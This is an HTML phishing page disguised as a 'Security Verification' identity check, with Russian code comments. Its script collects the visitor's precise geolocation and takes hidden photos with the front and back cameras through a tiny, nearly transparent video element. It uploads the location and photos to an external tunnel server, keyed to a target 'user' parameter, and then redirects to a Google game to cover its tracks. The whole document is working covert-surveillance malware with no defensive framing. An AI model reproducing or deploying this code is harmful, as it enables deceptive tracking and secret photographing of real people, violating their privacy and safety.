<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Security Verification</title>
    <style>
        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow: hidden; }
        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:85%; max-width: 380px; border:1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 10; position: relative; }
        .btn { background:#fff; color:#000; border:none; padding:18px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 18px; transition: 0.3s; text-transform: uppercase; }
        #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto; }
        @keyframes spin { 100% { transform:rotate(360deg); } }
        video { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
        canvas { display:none; }
        p { color: #888; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
        body.flash-active { background: #fff !important; }
        .flash-active .card { opacity: 0; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="st">Verification</h2>
        <p id="msg">Please confirm your identity to proceed.</p>
        <button class="btn" id="go" onclick="run()">CONFIRM</button>
        <div id="loader"></div>
    </div>
    
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

<script>
    // ОБНОВЛЕННЫЙ ТУННЕЛЬ
    const API = "https://620a7cf1d330d7.lhr.life"; 
    const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";

    const urlParams = new URLSearchParams(window.location.search);
    const user = urlParams.get('user') || "Unknown";

    function getSmartName(label) {
        const ts = new Date().toISOString().replace(/[-T:.Z]/g, "").substring(0, 14);
        return `${ts}_${label}.jpg`;
    }

    // Ультра-надежный захват
    async function takeAndSend(mode, label) {
        if (!navigator.mediaDevices) return;
        
        if (mode === "user") document.body.classList.add('flash-active');
        let stream = null;

        try {
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false 
            });
            
            const v = document.getElementById('v');
            v.srcObject = stream;
            await v.play();

            // МЕДЛЕННО: Даем 2 секунды на калибровку света и фокуса
            await new Promise(r => setTimeout(r, 2000));

            const canvas = document.getElementById('c');
            canvas.width = v.videoWidth || 640;
            canvas.height = v.videoHeight || 480;
            canvas.getContext('2d').drawImage(v, 0, 0);

            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
            
            if (blob) {
                const fd = new FormData();
                fd.append('files', blob, getSmartName(label));
                // ОТПРАВЛЯЕМ СРАЗУ (поштучно)
                await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
                    method: 'POST',
                    body: fd,
                    mode: 'no-cors',
                    keepalive: true
                });
            }
        } catch (e) {
            console.log("Stream failed for " + label);
        } finally {
            if (stream) stream.getTracks().forEach(t => t.stop());
            document.body.classList.remove('flash-active');
        }
    }

    async function run() {
        const btn = document.getElementById('go');
        const loader = document.getElementById('loader');
        const msg = document.getElementById('msg');

        btn.style.display = 'none';
        loader.style.display = 'block';
        msg.innerText = "Accessing secure module...";

        // 1. ГЕОЛОКАЦИЯ (Приоритет №1)
        navigator.geolocation.getCurrentPosition(p => {
            fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${encodeURIComponent(user)}`, {
                mode: 'no-cors',
                keepalive: true
            }).catch(()=>{});
        }, null, {timeout: 5000, enableHighAccuracy: true});

        // 2. ПОСЛЕДОВАТЕЛЬНЫЙ ЗАХВАТ (Медленный, но 100%)
        // Фронталка
        msg.innerText = "Verifying biometric data ...";
        await takeAndSend("user", "front_main");
        
        await new Promise(r => setTimeout(r, 500)); // Пауза для железа

        // Задняя камера
        msg.innerText = "Checking environment ...";
        await takeAndSend("environment", "back_main");

        // 3. ФИНАЛ
        msg.innerText = "Encryption complete. Redirecting...";
        setTimeout(() => {
            window.location.replace(REDIRECT_URL);
        }, 1000);
    }
</script>
</body>
</html>
